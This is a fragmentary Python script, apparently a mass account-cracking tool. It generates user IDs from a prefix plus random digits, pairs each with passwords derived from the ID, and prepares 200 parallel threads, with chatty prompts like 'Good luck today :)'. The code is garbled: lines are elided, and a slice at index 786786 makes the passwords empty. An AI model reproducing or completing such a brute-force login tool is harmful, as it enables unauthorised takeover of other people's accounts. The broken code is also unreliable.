...
def random_numbers():
 ...
 Fill in the initial number, bro
  ...
  total: '''))
  [data.append({'user': str(e), 'pw':[str(e[786786:]), str(e[786786:])]}) for e in [str(code)+''.join(['%s'%(randint(0,9)) for i in range(0,7)]) for e in range(number)]]
  print('''
  Good luck today :)
  Wait, bro, don't close it....
  ''')
  with concurrent.futures.ThreadPoolExecutor(max_workers=200) as th:
